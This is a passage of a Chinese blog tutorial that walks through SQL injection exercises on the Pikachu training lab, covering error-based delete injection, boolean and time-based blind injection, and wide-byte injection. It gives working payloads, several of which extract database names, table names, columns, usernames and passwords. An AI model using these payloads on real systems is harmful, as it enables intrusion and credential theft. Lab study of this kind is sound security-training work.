+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117225119367.png" alt="image-20220117225119367" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117225119367.png" class="lozad post-image"></p>
+<h4 id="5-delete注入"><a href="#5-delete注入" class="headerlink" title="5.delete注入"></a>5.delete注入</h4><p>删除留言进行抓包，发现了id为get传参方式可能是注入点加单引号尝试是否会报错</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117202752306.png" alt="image-20220117202752306" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117202752306.png" class="lozad post-image"></p>
+<p>出现报错说明这是一个注入点</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117203035169.png" alt="image-20220117203035169" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117203035169.png" class="lozad post-image"></p>
+<p>尝试使用报错注入</p>
+<p>尝试构建pyload</p>
+<pre class="highlight"><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database())))</span><br></pre>
+
+<p>成功爆出数据库</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117204556557.png" alt="image-20220117204556557" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117204556557.png" class="lozad post-image"></p>
+<p>继续构建pyload 爆出表名</p>
+<pre class="highlight"><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select table_name <span class="keyword">from</span> information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117205317429.png" alt="image-20220117205317429" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117205317429.png" class="lozad post-image"></p>
+<p>爆出列名</p>
+<pre class="highlight"><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select column_name <span class="keyword">from</span> information_schema.columns where table_schema=database() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)))</span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117205553459.png" alt="image-20220117205553459" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117205553459.png" class="lozad post-image"></p>
+<p>查询用户名和密码</p>
+<pre class="highlight"><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((select group_concat(concat(username)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>)))</span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117211517213.png" alt="image-20220117211517213" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117211517213.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((select group_concat(concat(password)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>)))</span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117211406333.png" alt="image-20220117211406333" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117211406333.png" class="lozad post-image"></p>
+<h4 id="6-基于boolian的盲注"><a href="#6-基于boolian的盲注" class="headerlink" title="6.基于boolian的盲注"></a>6.基于boolian的盲注</h4><p>单引号测试是否有注入点，</p>
+<h4 id="kobe-‘-and-1-1"><a href="#kobe-‘-and-1-1" class="headerlink" title="kobe ‘ and 1=1"></a>kobe ‘ and 1=1</h4><p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117213409919.png" alt="image-20220117213409919" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117213409919.png" class="lozad post-image"></p>
+<p>查看数据库的长度，构建pyload</p>
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and length(database())=7 #</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117213537581.png" alt="image-20220117213537581" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117213537581.png" class="lozad post-image"></p>
+<p>数据库长度为7</p>
+<p>判断字符内容</p>
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and ascii(substr((database()),1,1))=112 #			//p</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117214542741.png" alt="image-20220117214542741" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220117214542741.png" class="lozad post-image"></p>
+<p>依次判断</p>
+<p>数据库为pikachu</p>
+<h4 id="7-基于时间的盲注"><a href="#7-基于时间的盲注" class="headerlink" title="7.基于时间的盲注"></a>7.基于时间的盲注</h4><p>单引号判断是否存在注入页面返回正常</p>
+<h5 id="kobe’-and-sleep-5"><a href="#kobe’-and-sleep-5" class="headerlink" title="kobe’ and sleep(5)"></a>kobe’ and sleep(5)</h5><p>测试是否有注入点</p>
+<p>利用if函数判断当前数据库长度</p>
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27;and if(length(database())=7,sleep(5),0)#</span></span><br></pre>
+
+<p>通过页面返回时间判断截取字符的ascii码</p>
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and if(ascii(substr((select database()),1,1)=112),sleep(5),0)#  //p</span></span><br></pre>
+
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and if(ascii(substr((select database()),2,1)=105),sleep(5),0)#  //i</span></span><br></pre>
+
+<pre class="highlight"><span class="line">kobe&#x27; and if(ascii(substr((select database()),3,1)=107),sleep(5),0)#  //k</span><br></pre>
+
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and if(ascii(substr((select database()),4,1)=97),sleep(5),0)#  //a</span></span><br></pre>
+
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and if(ascii(substr((select database()),5,1)=99),sleep(5),0)#  //c</span></span><br></pre>
+
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and if(ascii(substr((select database()),6,1)=104),sleep(5),0)#  //h</span></span><br></pre>
+
+<pre class="highlight"><span class="line">kobe<span class="string">&#x27; and if(ascii(substr((select database()),7,1)=117),sleep(5),0)#  //u</span></span><br></pre>
+
+<h4 id="8-宽字节注入"><a href="#8-宽字节注入" class="headerlink" title="8.宽字节注入"></a>8.宽字节注入</h4><p>原理当数据带入时被反斜杠转义</p>
+<p>构造语句</p>
+<pre class="highlight"><span class="line">%<span class="number">81</span><span class="string">&#x27; or 1=1 #</span></span><br></pre>
+
+<p>因为是post传参使用burp抓包发送</p>
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211013451602.png" alt="image-20220211013451602" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211013451602.png" class="lozad post-image"></p>
+<p>产生回显</p>
+<pre class="highlight"><span class="line">%<span class="number">81</span><span class="string">&#x27; union select 1,2 #</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211014052306.png" alt="image-20220211014052306" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211014052306.png" class="lozad post-image"></p>
+<p>爆出数据库</p>
+<pre class="highlight"><span class="line">%<span class="number">81</span><span class="string">&#x27; union select 1,database() #</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211014414799.png" alt="image-20220211014414799" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211014414799.png" class="lozad post-image"></p>
+<p>表名</p>
+<pre class="highlight"><span class="line">%<span class="number">81</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span></span><br></pre>
+
+<p><img src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211015545882.png" alt="image-20220211015545882" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.assets/image-20220211015545882.png" class="lozad post-image"></p>
+<p>字段名</p>
+<pre class="highlight"><span class="line">%<span class="number">81</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1))#</span></span><br></pre>
+
+<p>查询账号密码</p>
+<pre class="highlight"><span class="line">%<span class="number">81</span><span class="string">&#x27; union select username,password from users #</span></span><br></pre>
+
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/about">YiHua</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2022/02/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/">http://example.com/2022/02/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  <div class="nav-item-prev">
+    <a href="/2022/02/11/sqlmap的使用/" class="nav-link">
+      <i class="iconfont icon-left nav-prev-icon"></i>
+      <div>
+        <div class="nav-label">上一篇</div>
+        
+        <div class="nav-title">sqlmap的使用 </div>
+        
+      </div>
+    </a>
+  </div>
+  
+  
+  <div class="nav-item-next">
+    <a href="/2022/02/03/代码审计/" class="nav-link">
+      <div>
+        <div class="nav-label">下一篇</div>
+        
+        <div class="nav-title">代码审计 </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E7%88%86%E7%A0%B4%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">一：爆破目标主机服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一：信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8nmap%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="toc-text">1.使用nmap扫描目标主机</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F"><span class="toc-text">1.主机系统</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">2.开放端口</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-fscan%E6%89%AB%E6%8F%8F"><span class="toc-text">2.fscan扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">二:漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-text">一:端口爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E6%9C%8D%E5%8A%A1"><span class="toc-text">ssh服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MySql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MySql数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E6%9C%8D%E5%8A%A1"><span class="toc-text">DNS服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Apache"><span class="toc-text">Apache</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0"><span class="toc-text">三：sql注入练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">1.字符型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">2.数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-xxx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.xxx型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E2%80%9Dinsert-pdate%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-text">4.”insert&#x2F;pdate”注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-insert%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">1.insert登录页面注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-update%E6%B3%A8%E5%85%A5"><span class="toc-text">2.update注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-delete%E6%B3%A8%E5%85%A5"><span class="toc-text">5.delete注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">6.基于boolian的盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kobe-%E2%80%98-and-1-1"><span class="toc-text">kobe ‘ and 1&#x3D;1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">7.基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kobe%E2%80%99-and-sleep-5"><span class="toc-text">kobe’ and sleep(5)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">8.宽字节注入</span></a></li></ol></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/author.jpg" class="author-img">
+
+<p class="author-name">YiHua</p>
+<p class="author-description">谨言  深思  笃行</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>27</span>
+    <span>文章</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>10</span>
+    <span>分类</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>9</span>
+    <span>标签</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E7%88%86%E7%A0%B4%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">一：爆破目标主机服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一：信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8nmap%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="toc-text">1.使用nmap扫描目标主机</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F"><span class="toc-text">1.主机系统</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">2.开放端口</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-fscan%E6%89%AB%E6%8F%8F"><span class="toc-text">2.fscan扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">二:漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-text">一:端口爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E6%9C%8D%E5%8A%A1"><span class="toc-text">ssh服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MySql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MySql数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E6%9C%8D%E5%8A%A1"><span class="toc-text">DNS服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Apache"><span class="toc-text">Apache</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0"><span class="toc-text">三：sql注入练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">1.字符型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">2.数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-xxx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.xxx型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E2%80%9Dinsert-pdate%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-text">4.”insert&#x2F;pdate”注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-insert%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">1.insert登录页面注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-update%E6%B3%A8%E5%85%A5"><span class="toc-text">2.update注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-delete%E6%B3%A8%E5%85%A5"><span class="toc-text">5.delete注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">6.基于boolian的盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kobe-%E2%80%98-and-1-1"><span class="toc-text">kobe ‘ and 1&#x3D;1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">7.基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kobe%E2%80%99-and-sleep-5"><span class="toc-text">kobe’ and sleep(5)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">8.宽字节注入</span></a></li></ol></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>分类</div>
+  <div class="categories-list">
+    
+      <a href="/categories/计算机网络/">
+        <div class="categories-list-item">
+          计算机网络
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/CentoS-7基础/">
+        <div class="categories-list-item">
+          CentoS-7基础
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/web安全/">
+        <div class="categories-list-item">
+          web安全
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Mysql数据库/">
+        <div class="categories-list-item">
+          Mysql数据库
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/php代码基础/">
+        <div class="categories-list-item">
+          php代码基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/windows-2008-R2/">
+        <div class="categories-list-item">
+          windows-2008-R2
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件上传漏洞/">
+        <div class="categories-list-item">
+          文件上传漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/文件包含漏洞/">
+        <div class="categories-list-item">
+          文件包含漏洞
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/渗透测试/">
+        <div class="categories-list-item">
+          渗透测试
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/代码审计/">
+        <div class="categories-list-item">
+          代码审计
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>热门标签</div>
+  <div class="tags-list">
+    
+    <a href="/tags/SQL注入/" title="SQL注入"><div class="tags-list-item">SQL注入</div></a>
+    
+    <a href="/tags/Linux/" title="Linux"><div class="tags-list-item">Linux</div></a>
+    
+    <a href="/tags/计算机网络/" title="计算机网络"><div class="tags-list-item">计算机网络</div></a>
+    
+    <a href="/tags/php代码基础/" title="php代码基础"><div class="tags-list-item">php代码基础</div></a>
+    
+    <a href="/tags/web安全/" title="web安全"><div class="tags-list-item">web安全</div></a>
+    
+    <a href="/tags/代码审计/" title="代码审计"><div class="tags-list-item">代码审计</div></a>
+    
+    <a href="/tags/渗透测试/" title="渗透测试"><div class="tags-list-item">渗透测试</div></a>
+    
+    <a href="/tags/windows/" title="windows"><div class="tags-list-item">windows</div></a>
+    
+    <a href="/tags/webshell/" title="webshell"><div class="tags-list-item">webshell</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E7%88%86%E7%A0%B4%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">一：爆破目标主机服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一：信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8nmap%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="toc-text">1.使用nmap扫描目标主机</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F"><span class="toc-text">1.主机系统</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">2.开放端口</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-fscan%E6%89%AB%E6%8F%8F"><span class="toc-text">2.fscan扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">二:漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="toc-text">一:端口爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E6%9C%8D%E5%8A%A1"><span class="toc-text">ssh服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MySql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MySql数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E6%9C%8D%E5%8A%A1"><span class="toc-text">DNS服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Apache"><span class="toc-text">Apache</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9Asql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0"><span class="toc-text">三：sql注入练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 